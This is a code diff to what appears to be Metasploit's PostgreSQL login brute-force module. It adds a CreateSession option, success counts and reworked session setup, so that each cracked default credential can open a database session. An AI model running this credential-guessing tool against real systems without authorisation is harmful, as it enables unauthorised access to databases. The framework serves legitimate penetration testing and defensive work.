@@ -45,6 +45,7 @@ class MetasploitModule < Msf::Auxiliary
           File.join(Msf::Config.data_directory, "wordlists", "postgres_default_user.txt") ]),
         OptPath.new('PASS_FILE',      [ false, "File containing passwords, one per line",
           File.join(Msf::Config.data_directory, "wordlists", "postgres_default_pass.txt") ]),
+        OptBool.new('CreateSession', [false, 'Create a new session for every successful login', false])
       ])
 
     options_to_deregister = %w[SQL PASSWORD_SPRAY]
@@ -62,6 +63,19 @@ class MetasploitModule < Msf::Auxiliary
     else
       false
     end
+  end
+
+  def run
+    results = super
+    logins = results.flat_map { |_k, v| v[:successful_logins] }
+    sessions = results.flat_map { |_k, v| v[:successful_sessions] }
+    print_status("Bruteforce completed, #{logins.size} #{logins.size == 1 ? 'credential was' : 'credentials were'} successful.")
+    if datastore['CreateSession']
+      print_status("#{sessions.size} Postgres #{sessions.size == 1 ? 'session was' : 'sessions were'} opened successfully.")
+    else
+      print_status('You can open a Postgres session with these credentials and %grnCreateSession%clr set to true')
+    end
+    results
   end
 
   # Loops through each host in turn. Note the current IP address is both
@@ -85,7 +99,8 @@ class MetasploitModule < Msf::Auxiliary
       framework_module: self,
       use_client_as_proof: create_session?
     )
-
+    successful_logins = []
+    successful_sessions = []
     scanner.scan! do |result|
       credential_data = result.to_h
       credential_data.merge!(
@@ -98,15 +113,15 @@ class MetasploitModule < Msf::Auxiliary
         create_credential_login(credential_data)
 
         print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
+        successful_logins << result
 
         if create_session?
           begin
-            postgresql_client = result.proof
-            session_setup(result, postgresql_client)
+            successful_sessions << session_setup(result)
           rescue ::StandardError => e
-            elog('Failed: ', error: e)
-            print_error(e)
-            result.proof.conn.close if result.proof&.conn
+            elog('Failed to setup the session', error: e)
+            print_brute level: :error, ip: ip, msg: "Failed to setup the session - #{e.class} #{e.message}"
+            result.connection.close unless result.connection.nil?
           end
         end
       else
@@ -114,7 +129,7 @@ class MetasploitModule < Msf::Auxiliary
         vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
       end
     end
-
+    { successful_logins: successful_logins, successful_sessions: successful_sessions }
   end
 
   # Alias for RHOST
@@ -127,12 +142,13 @@ class MetasploitModule < Msf::Auxiliary
     datastore['RPORT']
   end
 
-  def session_setup(result, client)
-    return unless (result && client)
+  # @param [Metasploit::Framework::LoginScanner::Result] result
+  # @return [Msf::Sessions::PostgreSQL]
+  def session_setup(result)
+    return unless (result.connection && result.proof)
 
-    rstream = client.conn
-    my_session = Msf::Sessions::PostgreSQL.new(rstream, { client: client })
-    merging = {
+    my_session = Msf::Sessions::PostgreSQL.new(result.connection, { client: result.proof, **result.proof.detect_platform_and_arch })
+    merge_me = {
       'USERPASS_FILE' => nil,
       'USER_FILE'     => nil,
       'PASS_FILE'     => nil,
@@ -140,6 +156,6 @@ class MetasploitModule < Msf::Auxiliary
       'PASSWORD'      => result.credential.private
     }
 
-    start_session(self, nil, merging, false, my_session.rstream, my_session)
+    start_session(self, nil, merge_me, false, my_session.rstream, my_session)
   end
 end
